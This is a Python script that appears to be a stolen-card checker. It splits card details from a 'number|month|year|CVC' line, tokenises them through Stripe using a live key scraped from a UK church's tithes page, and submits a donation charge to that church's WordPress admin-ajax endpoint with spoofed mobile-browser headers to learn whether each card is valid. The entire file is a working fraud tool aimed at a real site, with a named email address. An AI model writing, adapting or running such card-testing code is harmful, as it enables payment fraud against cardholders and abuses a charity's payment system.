import requests, re
import random

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]

    if "20" in yy:  # Mo3gza
        yy = yy.split("20")[1]

    r = requests.session()

    random_amount1 = random.randint(1, 4)
    random_amount2 = random.randint(1, 99)

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2410DPN6CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&billing_details[name]=Min+Thant&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=955aa4a4-149f-4375-946f-dff40d9f59cb536d5b&muid=b7054ee1-028f-47dc-b7a5-00acaea7e0f2767ea5&sid=11015094-7c28-40d9-9209-34221a0e860829522c&payment_user_agent=stripe.js%2F328730e3ee%3B+stripe-js-v3%2F328730e3ee%3B+card-element&referrer=https%3A%2F%2Frivernetworkchurch.org.uk&time_on_page=28921&client_attribution_metadata[client_session_id]=aafc5276-da48-4b35-967f-e05e9a2cd2c4&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Op8d8GLdQ7N2bVjuMWV6qteyKXoHklyfJXorljrH32nZ9vLEJyvfN77EY4Clpdlkd1AN7xjrd17nJWolSI4bpNA004zu0cPZh'

    response = requests.post(
        'https://api.stripe.com/v1/payment_methods',
        headers=headers,
        data=data
    )

    pm = response.json()['id']

    headers = {
        'authority': 'rivernetworkchurch.org.uk',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://rivernetworkchurch.org.uk',
        'referer': 'https://rivernetworkchurch.org.uk/tithes-offerings/',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2410DPN6CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'wp_full_stripe_inline_donation_charge',
        'wpfs-form-name': 'RiverNetworkChurchDonation',
        'wpfs-form-get-parameters': '%7B%7D',
        'wpfs-custom-amount': 'other',
        'wpfs-custom-amount-unique': '1',
        'wpfs-donation-frequency': 'one-time',
        'wpfs-card-holder-email': 'minthantshin.virus11@gmail.com',
        'wpfs-card-holder-name': 'Min Thant',
        'wpfs-stripe-payment-method-id': f'{pm}',
    }

    response = requests.post(
        'https://rivernetworkchurch.org.uk/wp-admin/admin-ajax.php',
        headers=headers,
        data=data
    )

    result = response.json()['message']
    return result
